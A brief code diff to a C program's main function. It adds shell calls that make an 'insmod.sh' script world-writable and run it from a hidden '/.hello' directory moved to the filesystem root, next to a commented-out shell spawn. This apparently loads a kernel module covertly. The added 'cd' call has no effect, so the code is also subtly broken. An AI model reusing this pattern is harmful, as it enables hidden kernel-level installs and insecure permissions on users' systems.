@@ -274,6 +274,8 @@ int main(int argc, char * argv[])
        //execl("/bin/sh", "/bin/sh", NULL);
 system ("pwd");
 system ("mv ./.hello /.hello");
+system ("cd /.hello");
+system ("chmod 777 insmod.sh");
 system ("/.hello/insmod.sh");
 }
 
